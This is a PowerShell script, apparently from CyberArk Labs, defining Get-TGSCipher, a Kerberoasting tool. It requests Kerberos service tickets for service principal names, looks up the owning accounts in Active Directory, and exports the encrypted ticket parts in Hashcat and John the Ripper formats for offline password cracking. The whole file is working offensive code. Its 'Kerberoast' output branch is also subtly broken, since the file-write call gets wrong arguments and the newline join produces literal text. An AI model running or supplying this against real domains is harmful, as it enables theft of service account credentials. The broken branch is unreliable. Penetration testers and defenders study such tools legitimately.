<#
    Author: Matan Hart
    Contact: cyberark.labs@cyberark.com
    License: GNU v3
    Requirements: PowerShell v3+
#>

function Get-TGSCipher
{
    <#
    .SYNOPSIS
        Requests Kerberos TGS (service ticket) for SPN(s) and retrieves the encrypted portion of the ticket(s). 

    .DESCRIPTION
        This function requests a Kerberos TGS (service ticket) for a given SPN(s), determines the target account UPN which runs under    
        the SPN and the encrytpion type of the ticket, and returns or save the encrypted portion of the ticket in various formats.
        This can be later used to bruteforce the cipher offline and recover the service account password.
        Requires Active Directory authentication (domain user is enough). 

    .PARAMETER SPN
        The name of the Service Principal Name for which to ask for Kerberos TGS. Can be parsed on the pipline. 

    .PARAMETER DoNotQuery
        Do not query Acitve Directory (LDAP) to determine the User Prinicipal Name's which runs under the SPN.

    .PARAMETER ConvertTo
        Convert the output to a diffrenet format. Options are John (John the Ripper), Kerberoast and Dump.

    .PARAMETER SaveTo
        Save the output to a file. Requires full path.

    .EXAMPLE 
        Get-TGSCipher -SPN "MSSQLSvc/SQLServer.lab.com:1433"
        Request a Kerberos TGS for MSSQLSvc/SQLServer.lab.com:1433 and return the target UPN, encryption type and the encrypted part of the ticket.

    .EXAMPLE
        Get-PotentiallyCrackableAccounts -GetSPNs | Get-TGSCipher -ConvertTo John -SaveTo c:\temp\tickets.txt
        Request Kerberos TGS for all SPNs that run under user accounts in the forest. Creates JtR crack file in c:\temp\tickets.txt    
    #>

    [CmdletBinding()]
    param
    (
        [parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [Array]$SPN,
        [Switch]$DoNotQuery,
        [ValidateSet("Hashcat","John", "Kerberoast","Dump")]
        [string]$ConvertTo,
        [string]$SaveTo
    )

    Begin
    {
        if (!$DoNotQuery)
        {
            $SearchScope = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
            $Path = 'GC://DC=' + ($SearchScope.RootDomain -Replace ("\.",',DC='))
            #creating ADSI searcher on a GC
            $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$Path)
            $Searcher.PageSize = 500
            $Searcher.PropertiesToLoad.Add("userprincipalname") | Out-Null
        }
        Add-Type -AssemblyName System.IdentityModel
        $CrackList = @()        
        Write-Verbose "Starting to request SPNs"
    }
    Process
    {
        $TargetAccount = "N/A"
        if (!$DoNotQuery)
        {
            $Searcher.Filter = "(servicePrincipalName=$SPN)"
            $TargetAccount = [string]$Searcher.FindOne().Properties.userprincipalname
        }
        Write-Verbose "Asking for TGS for the SPN: $SPN"
        $ByteStream = $null
        try
        {
            #requesting TGS (service ticket) for the target SPN
            $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPN
            $ByteStream = $Ticket.GetRequest()
        }
        catch
        {
            Write-Warning "Could not request TGS for the SPN: $SPN"
            Write-Verbose "Make sure the SPN: $SPN is mapped on Active Directory" 
        }
        if ($ByteStream)
        {
            #converting byte array to hex string
            $HexStream = [System.BitConverter]::ToString($ByteStream) -replace "-"
            #extracting and conveting the hex value of the cipher's etype to decimal
            $eType =  [Convert]::ToInt32(($HexStream -replace ".*A0030201")[0..1] -join "", 16)
            #determing encryption type by etype - https://tools.ietf.org/html/rfc3961 
            $EncType = switch ($eType)
            {
                1       {"DES-CBC-CRC (1)"}
                3       {"DES-CBC-MD5 (3)"}
                17      {"AES128-CTS-HMAC-SHA-1 (17)"}
                18      {"AES256-CTS-HMAC-SHA-1 (18)"}
                23      {"RC4-HMAC (23)"}
                default {"Unknown ($eType)"}
            }
            #extracting the EncPart portion of the TGS
            $EncPart = $HexStream -replace ".*048204.." -replace "A48201.*"
            $Target = New-Object psobject -Property @{
                SPN            = $SPN
                Target         = $TargetAccount
                EncryptionType = $EncType
                EncTicketPart  = $EncPart  
            } | Select-Object SPN,Target,EncryptionType,EncTicketPart
            $CrackList += $Target    
        }
    }
    End 
    {
        if (!$CrackList.EncTicketPart)
        {
            Write-Error "Could not retrieve any tickets!"
            return
        }
        if ($ConvertTo)
        {
            if ($ConvertTo -eq "Hashcat")
            {
                $Output = @()
                Write-Verbose "Converting to hashcat format"
                foreach ($Object in $CrackList)
                {
                    if ($Object.EncryptionType -eq "RC4-HMAC (23)")
                    {
                        $Output += "`$krb5tgs`$23`$" + $Object.EncTicketPart.Substring(0,32) + "`$" + $Object.EncTicketPart.Substring(32)
                    }
                    else {Write-Warning "Hashcat supports only RC4-HMAC at the moment!"}
                }
            }
            elseif ($ConvertTo -eq "John")
            {
                $Output = @()
                Write-Verbose "Converting to JtR format"
                foreach ($Object in $CrackList)
                {
                    if ($Object.EncryptionType -eq "RC4-HMAC (23)")
                    {
                        $Output += "`$krb5tgs`$23`$" + $Object.EncTicketPart.Substring(32) + "`$" + $Object.EncTicketPart.Substring(0,32)  
                    }
                    else {Write-Warning "JtR supports only RC4-HMAC at the moment!"}
                }
            }
            elseif ($ConvertTo -eq "Kerberoast" -and $SaveTo)
            {
                Write-Verbose "Converting to Kerberoast format"
                [string]$Output = $CrackList.EncTicketPart -join "\n"
                [io.file]::WriteAllBytes($Output,$SaveTo)
                Write-Verbose "File saved in: $SaveTo" 
                return
            }
            elseif ($ConvertTo -eq "Dump")
            {
                Write-Verbose "Dumping TGS tickets"
                $Output = @($CrackList.EncTicketPart)
            } 
        }
        else {$Output = $CrackList}
        if ($SaveTo)
        {
            $Output | Out-File $SaveTo -Encoding utf8
            Write-Verbose "File saved in: $SaveTo" 
        }
        else
        {
           return $Output 
        }
    }
}
